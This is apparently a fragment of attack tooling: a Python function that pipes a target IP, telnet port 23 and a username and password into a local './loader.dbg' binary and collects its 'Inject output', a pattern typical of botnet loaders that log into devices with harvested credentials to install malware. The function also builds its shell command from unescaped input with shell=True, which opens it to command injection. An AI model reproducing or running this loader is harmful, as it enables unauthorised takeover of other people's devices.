
import subprocess

async def start_inject_service(ip, username, password):
    
    port = 23
    content = f"{ip}:{port} {username}:{password}"
    command = f"echo '{content}' | ./loader.dbg"

    try:
        process = subprocess.Popen(
            command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE
        )
        
        output_lines = []
        
        # Capture output until the process finishes
        while True:
            stdout_line = process.stdout.readline()
            if stdout_line:
                decoded_output = stdout_line.decode('utf-8', errors='ignore').strip()
                print(f"Inject output: {decoded_output}")
                output_lines.append(decoded_output)  # Store output for later use

            if process.poll() is not None:
                break 

        #return_code = process.wait()
        
        final_output = "\n".join(output_lines)
        print(final_output)
        return final_output  # Return the final output for checking

    except Exception as e:
        return f"Error during Inject execution: {e}"
        
